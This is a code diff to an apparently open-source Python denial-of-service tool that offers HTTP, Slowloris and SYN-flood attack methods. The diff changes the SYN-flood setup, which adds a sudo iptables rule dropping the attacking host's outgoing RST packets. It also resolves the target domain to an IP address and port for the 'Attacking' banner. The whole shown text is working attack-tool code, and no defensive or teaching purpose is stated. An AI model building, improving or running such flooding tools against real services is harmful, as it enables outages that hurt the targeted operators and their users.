@@ -12,7 +12,7 @@ from typing import Callable, Dict, Iterator, List, Tuple, Union
 from colorama import Fore as F
 from humanfriendly import Spinner, format_timespan
 
-from tools.addons.ip_tools import get_host_ip, get_target_address
+from tools.addons.ip_tools import get_host_ip, get_target_address, get_target_domain
 from tools.addons.sockets import create_socket, create_socket_proxy
 
 
@@ -28,10 +28,12 @@ def get_method_by_name(method: str) -> Callable:
     if method in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
         layer_number = 7
     elif method in ["syn-flood"]:
-        rule = os.popen(
-            f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
-        ).read()
-        if rule == "":
+        rule = int(
+            os.popen(
+                f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP > /dev/null 2>&1; echo $?"
+            ).read()[0]
+        )
+        if rule:
             os.system(
                 f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
             )
@@ -161,9 +163,16 @@ class AttackMethod:
 
     def start(self) -> None:
         """Start the DoS attack itself."""
+        try:
+            domain, port = get_target_domain(self.target).split(":")
+        except ValueError:
+            domain, port = get_target_domain(self.target), 80
+
+        ip = socket.gethostbyname(domain)
         duration = format_timespan(self.duration)
+
         print(
-            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target.split('http://')[1]}{F.BLUE} using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
+            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target.split('http://')[1]} {F.BLUE}({ip}:{port}) using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
         )
         if "slowloris" in self.method_name:
             print(
